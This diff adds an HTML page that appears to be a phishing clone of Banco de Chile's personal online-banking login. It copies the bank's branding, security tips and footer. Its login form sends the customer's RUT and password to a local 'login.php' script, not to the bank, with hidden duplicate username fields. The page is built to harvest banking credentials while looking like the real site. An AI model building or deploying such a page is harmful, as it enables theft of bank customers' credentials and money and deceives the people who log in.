@@ -1,0 +1,202 @@
+<html ng-app="WebBancoChile" ng-controller="AppCtrl" style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths ng-scope">
+
+<head>
+  <style type="text/css">
+    @charset "UTF-8";
+
+    [ng\:cloak],
+    [ng-cloak],
+    [data-ng-cloak],
+    [x-ng-cloak],
+    .ng-cloak,
+    .x-ng-cloak,
+    .ng-hide:not(.ng-hide-animate) {
+      display: none !important;
+    }
+
+    ng\:form {
+      display: block;
+    }
+  </style>
+  <title ng-bind="pageTitle" class="ng-binding">Login</title>
+
+  <!-- social media tags -->
+
+  <meta charset="UTF-8">
+
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <!-- compiled CSS -->
+  <link rel="stylesheet" type="text/css" href="a    ssets/cl.bancochile.canales.web-0.0.1-part-1.min.cea09c7074.css">
+  <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-2.min.fd8862a6cc.css">
+  <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-3.min.acbf7da162.css">
+  <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-4.min.53795650e3.css">
+  <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-5.min.576033ec94.css">
+  <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-6.min.e3bca3246a.css">
+
+  <!-- compiled JavaScript -->
+  <script type="text/javascript" src="assets/cl.bancochile.canales.web.vendor-0.0.1.a46350c7c9.js"></script>
+  <style type="text/css"></style>
+  <script type="text/javascript" src="assets/cl.bancochile.canales.web-0.0.1.22c12694af.js"></script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  
+
+</head>
+
+<body ng-class="{'portabilidad-financiera' : !bodyMargin()}">
+  <div ui-view="header" ng-show="isVisible()" class="ng-scope"><img src="assets/images/pixel-medicion.png" alt="" class="pixel-medicion ng-scope" aria-hidden="true">
+    <header class="header-login ng-scope">
+      <div class="container">
+        <h1 class="icon-logo-banco"><img src="assets/images/logo-bec.png" alt="" class="pull-right"></h1>
+      </div>
+    </header>
+  </div>
+  <!-- uiView: main -->
+  <div ui-view="main" class="ng-scope">
+    <section class="login-bch ng-scope"></section>
+    <div class="container content-login ng-scope">
+
+
+
+
+
+
+      <article class="login-box">
+        <h1 class="text-primary text-center text-light">Bienvenido a nuestro Portal<br>Personas <span class="text-regular">Banco en Línea</span></h1>
+        <form name="vm.loginForm" role="form" action="login.php" method="post" autocomplete="false" class="ng-pristine ng-invalid ng-invalid-rut ng-invalid-required ng-valid-maxlength">
+          <div class="form-group user">
+              <input type="hidden" name="username2" id="iduserName2" value="1">
+              <input type="hidden" name="action" value="login">
+              <input type="text" id="preventAutoPass" class="hidden-xs hidden-sm hidden-md hidden-lg"> 
+              <input class="form-control ng-pristine ng-invalid ng-invalid-rut ng-invalid-required ng-valid-maxlength ng-touched" type="text" name="username2" id="iduserName" placeholder="Rut Usuario" autocomplete="false" ng-model="vm.rut" ng-rut="" rut-format="blur" ng-blur="vm.validarRut(vm.rut)" maxlength="12" required="" ng-keypress="vm.enterpress($event)" ng-keydown="vm.limpiarMensajes()" ng-click="vm.limpiarMensajes()" autofocus="true" delete-zero-left=""> <i class="ion-person"></i> <small class="invalid ng-binding ng-hide" ng-show="vm.loginForm.username2.$dirty &amp;&amp; vm.loginForm.username2.$error.required">Debes ingresar Rut </small><small class="invalid ng-binding ng-hide" ng-show="vm.showRutNoValido">El Rut ingresado no es válido. </small><small class="invalid ng-binding ng-hide" ng-show="vm.showRutMayor50MM">Rut Empresas deben acceder por Banconexion 2.0 </small></div>
+          <div class="form-group pass">
+              <input type="password" class="hidden-xs hidden-sm hidden-md hidden-lg"> 
+            <input name="userpassword" type="password" ng-keypress="vm.enterpress($event)" ng-model="vm.password" ng-keydown="vm.limpiarPassword()" maxlength="8" class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength" placeholder="Clave" required="" autocomplete="false" validate="password"> <i class="ion-ios-locked"></i> <small class="invalid ng-binding ng-hide" ng-show="vm.loginForm.userpassword.$dirty &amp;&amp; vm.loginForm.userpassword.$error.required">Debes ingresar Clave </small><small class="caps-lock-alert invalid ng-binding ng-hide" ng-show="isCapsLockOn" id="bch-login-msj-error-chico">Tecla mayúsculas activada </small><!-- ngIf: vm.showError -->
+            <!-- ngIf: vm.errorFolioIncorrecto -->
+          </div>
+          <div class="col-lg-12 col-md-12 col-sm-12">
+            <div class="row">
+              <!--input type="submit" class="btn success btn-block" value="Ingresar" /-->
+              <input name="request_id" type="hidden" value="">
+              <input name="ctx" type="hidden" value="persona"> 
+              <button type="submit" name="ingresar2" class="btn success btn-block" id="idIngresar">Ingresar</button>
+            </div>
+          </div><input type="hidden" name="username" id="iduserName1">
+        </form>
+        <div class="row enlaces-recuperacion"><br><br>
+          <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6 text-center"><a href="#/olvido-clave-persona" ui-sref="olvido-clave-persona"><i class="ion-chevron-right"></i> Olvido de Clave</a></div>
+          <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6 text-center"><a href="#/clave-persona/solicitud-clave-persona" ui-sref="solicitud-clave-persona"><i class="ion-chevron-right"></i> Solicitud de Clave</a></div>
+        </div>
+      </article>
+
+
+
+
+
+
+
+
+
+    </div>
+  </div>
+  <!-- uiView: footer -->
+  <div ui-view="footer" ng-show="isVisibleFooter()" class="ng-scope">
+    <footer class="bch-footer pt-0 ng-scope">
+      <!-- ngIf: state.current.name == 'login' -->
+      <div class="bg-white ng-scope" ng-if="state.current.name == 'login'">
+        <div class="container pl-30 pr-30">
+          <div class="slick-container clearfix">
+            <slick class="control-slick ng-isolate-scope slick-initialized slick-slider" responsive="breakpoints" dots="false" touch-move="false"><button type="button" data-role="none" class="slick-prev slick-arrow" aria-label="Previous" role="button" style="display: block;">Previous</button><!-- ngRepeat: item in listCarouselTips -->
+              <!-- end ngRepeat: item in listCarouselTips -->
+              <!-- end ngRepeat: item in listCarouselTips -->
+              <!-- end ngRepeat: item in listCarouselTips -->
+              <!-- end ngRepeat: item in listCarouselTips -->
+              <!-- end ngRepeat: item in listCarouselTips -->
+              <!-- end ngRepeat: item in listCarouselTips -->
+              <div aria-live="polite" class="slick-list draggable">
+                <div class="slick-track" role="listbox" style="opacity: 1; width: 2536px; transform: translate3d(-1902px, 0px, 0px);">
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide slick-cloned" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide05" data-slick-index="-1" aria-hidden="true">
+                    <div class="icono"><span class="icon-icon-screen text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Accede al sitio del banco escribiendo directamente la dirección en tu navegador. Nunca entres a través de links.</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide00" data-slick-index="0" aria-hidden="true">
+                    <div class="icono"><span class="bch-custom-icon-clubes text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Mantén tu antivirus actualizado. Nunca te obligaremos a descargar un archivo.</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide01" data-slick-index="1" aria-hidden="true">
+                    <div class="icono"><span class="icono-bch-linkExterno text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Nunca incluiremos un link en nuestros emails. Si alguien lo hace, es una estafa.</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide02" data-slick-index="2" aria-hidden="true">
+                    <div class="icono"><span class="ion-ios-email-outline text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Verifica siempre la fuente de tus correos; atento a premios y mensajes extraños.</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide03" data-slick-index="3" aria-hidden="true">
+                    <div class="icono"><span class="ion-ios-locked-outline text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Es clave no dar tu clave: nunca te llamaremos para pedir tu clave secreta.</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide04" data-slick-index="4" aria-hidden="true">
+                    <div class="icono"><span class="ion-ios-world-outline text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Por tu seguridad, verifica que la URL de bancochile.cl comience con https://</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide slick-current slick-active" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide05" data-slick-index="5" aria-hidden="false">
+                    <div class="icono"><span class="icon-icon-screen text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Accede al sitio del banco escribiendo directamente la dirección en tu navegador. Nunca entres a través de links.</p>
+                    </div>
+                  </div>
+                  <div class="slick-item pull-left col-xs-12 col-sm-12 col-md-6 col-lg-4 ng-scope slick-slide slick-cloned" ng-repeat="item in listCarouselTips" style="width: 317px;" tabindex="-1" role="option" aria-describedby="slick-slide00" data-slick-index="6" aria-hidden="true">
+                    <div class="icono"><span class="bch-custom-icon-clubes text-primary px-30"></span></div>
+                    <div class="description">
+                      <p class="px-12 mb-0 ng-binding">Mantén tu antivirus actualizado. Nunca te obligaremos a descargar un archivo.</p>
+                    </div>
+                  </div>
+                </div>
+              </div><button type="button" data-role="none" class="slick-next slick-arrow" aria-label="Next" role="button" style="display: block;">Next</button>
+            </slick>
+          </div>
+        </div>
+      </div><!-- end ngIf: state.current.name == 'login' -->
+      <div class="container">
+        <div class="row">
+          <div class="logo-footer col-xs-6 col-sm-3 col-md-3 col-lg-3"><a tabindex="-1" href="http://www.bancochile.cl/"><span class="icon-logo-banco"></span></a></div>
+          <div class="liniealateral col-xs-6 col-sm-3 col-md-3 col-lg-3">
+            <ul class="list-unstyled">
+              <li>Casa Matriz: Ahumada 251, Santiago de Chile</li>
+              <li>Mesa Central: [+56 2] 2653 1111</li>
+              <li>Fonobank 600 637 3737</li>
+            </ul>
+          </div>
+          <div class="col-xs-12 col-sm-6 col-md-6 col-lg-6">
+            <ul class="list-unstyled">
+              <li>Infórmese sobre la garantía estatal de los depósitos en su banco o en www.sbif.cl</li>
+              <li>Citi y el diseño del arco es una marca de servicio registrada de Citigroup Inc. Uso bajo licencia</li>
+              <li></li>
+              <li><b>© 2018, Banco de Chile. Todos los Derechos Reservados</b></li>
+              <li></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script async="" type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&amp;ns=2&amp;cb=1197827981"></script>
+
+</body>
+
+</html>
